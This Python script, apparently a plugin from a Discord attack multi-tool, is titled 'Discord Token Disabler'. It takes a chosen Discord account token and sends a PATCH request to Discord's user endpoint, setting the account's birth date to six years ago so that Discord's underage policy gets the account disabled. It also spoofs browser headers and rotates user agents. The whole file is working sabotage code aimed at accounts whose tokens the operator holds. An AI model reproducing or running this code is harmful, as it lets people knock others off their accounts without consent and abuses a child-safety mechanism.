# Copyright (c) 2026 v4lkyr0
# See LICENSE file for details

from Plugins.Utils import *
from Plugins.Config import *

try:
    from datetime import datetime
    import requests
except Exception as e:
    MissingModule(e)

Title("Discord Token Disabler")
Connection()

try:
    token = ChoiceToken()

    print(f"{LOADING} Disabling Token..", reset)

    current_year  = datetime.now().year
    current_month = datetime.now().month
    birth_year    = current_year - 6
    birth_date    = f"{birth_year}-{current_month}-12"

    url     = "https://discord.com/api/v9/users/@me"
    data    = {"date_of_birth": birth_date}
    headers = {
        "accept": "*/*",
        "accept-language": "en-US",
        "authorization": token,
        "content-type": "application/json",
        "user-agent": RandomUserAgents(),
        "sec-ch-ua": '"Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92"',
        "sec-ch-ua-mobile": "?0",
        "x-debug-options": "bugReporterEnabled"
    }

    try:
        response = requests.patch(url, headers=headers, json=data)
        if response.status_code == 200:
            print(f"{SUCCESS} Token disabled!", reset)
        else:
            print(f"{ERROR} Failed to disable Token!", reset)
    except:
        print(f"{ERROR} Error while trying to disable Token!", reset)

    Continue()
    Reset()

except Exception as e:
    Error(e)